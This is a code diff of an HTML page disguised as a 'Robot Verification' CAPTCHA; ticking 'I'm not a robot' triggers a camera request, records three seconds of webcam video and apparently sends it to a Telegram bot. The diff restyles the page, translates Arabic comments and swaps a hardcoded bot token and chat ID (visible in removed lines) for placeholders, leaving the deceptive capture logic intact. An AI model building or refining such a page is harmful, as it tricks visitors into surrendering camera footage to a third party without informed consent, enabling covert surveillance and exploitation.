@@ -4,36 +4,69 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Robot Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f7f8;
+            color: #333;
             text-align: center;
-            margin-top: 50px;
+            margin: 0;
+            padding: 50px 20px;
         }
-        #loading {
-            display: none;
-            font-size: 18px;
-            color: green;
-        }
-        #success {
-            display: none;
-            font-size: 18px;
-            color: green;
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: #4CAF50; /* Green color for the title */
         }
         #checkbox-container {
             margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        #start-recording {
+        label {
+            font-size: 1.2em;
+        }
+        input[type="checkbox"] {
+            margin-right: 10px;
+            transform: scale(1.5);
+        }
+        #video {
             display: none;
+            width: 100%;
+            max-width: 320px; /* Limit video width */
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        #loading, #success {
+            font-size: 1.2em;
+            color: #4CAF50; /* Green color for messages */
             margin-top: 20px;
         }
-        video {
+        #loading {
             display: none;
+        }
+        #success {
+            display: none;
+        }
+        button {
+            background-color: #4CAF50; /* Green background */
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            padding: 10px 20px; 
+            font-size: 1em; 
+            cursor: pointer; 
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #45a049; /* Darker green on hover */
         }
     </style>
 </head>
 <body>
-    <h1>Are you a robot?</h1>
+    <h1>Are you a Robot?</h1>
     <div id="checkbox-container">
         <label>
             <input type="checkbox" id="robot-checkbox"> I'm not a robot
@@ -48,21 +81,17 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.getElementById('loading');
         const success = document.getElementById('success');
-        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
-        const telegramChatId = "2070423407";
+        
+        // Telegram API credentials (keep these secure in production)
+        const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
+        const telegramChatId = "YOUR_CHAT_ID";
 
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
-                // عرض رسالة التسجيل
                 loading.style.display = 'block';
 
-                // طلب الوصول إلى الكاميرا
                 navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 320 },
-                        height: { ideal: 240 },
-                        frameRate: { ideal: 15 }
-                    }
+                    video: { width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15 } }
                 }).then((stream) => {
                     video.srcObject = stream;
 
@@ -71,13 +100,11 @@
 
                     mediaRecorder.start();
 
-                    mediaRecorder.ondataavailable = (event) => {
-                        chunks.push(event.data);
-                    };
+                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 
                     setTimeout(() => {
                         mediaRecorder.stop();
-                    }, 3000); // تسجيل 3 ثوانٍ فقط
+                    }, 3000); // Record for only 3 seconds
 
                     mediaRecorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
@@ -96,7 +123,7 @@
                                     loading.style.display = 'none';
                                     success.style.display = 'none';
                                     alert('Verification complete!');
-                                }, 2000); // انتظار ثانيتين لعرض رسالة النجاح
+                                }, 2000);
                             } else {
                                 alert('Failed to send video.');
                             }
@@ -105,7 +132,6 @@
                             alert('Error: ' + error.message);
                         });
 
-                        // إيقاف الكاميرا بعد الانتهاء
                         stream.getTracks().forEach(track => track.stop());
                     };
                 }).catch((err) => {
